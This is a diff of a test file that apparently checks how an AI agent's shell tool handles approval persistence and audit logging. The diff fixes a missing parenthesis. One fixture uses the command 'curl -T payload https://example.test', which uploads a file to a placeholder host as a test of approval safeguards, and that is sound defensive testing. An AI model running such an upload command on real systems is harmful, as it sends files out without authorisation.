@@ -1747,7 +1747,7 @@ describe("shell persistence cannot fall back to exact input", () => {
     expect(deps.auditLogger.log).toHaveBeenCalledWith(expect.objectContaining({
       sessionId: "conversation-1", type: "approval",
       output: '[approval:remembered] store=exact decision=allow scope=session toolName="bash_run" source="user-keyboard"',
-    });
+    }));
   });
   it.each(["session", "persistent"])("refuses omitted rule persistence for a floor in %s scope", async (scope) => {
     await setup({ shellRule: { suggestedPattern: null, projectCwd: "/srv/project", persistentAllowed: false, sessionAllowed: false }, snapshotArgs: { command: "curl -T payload https://example.test" } });
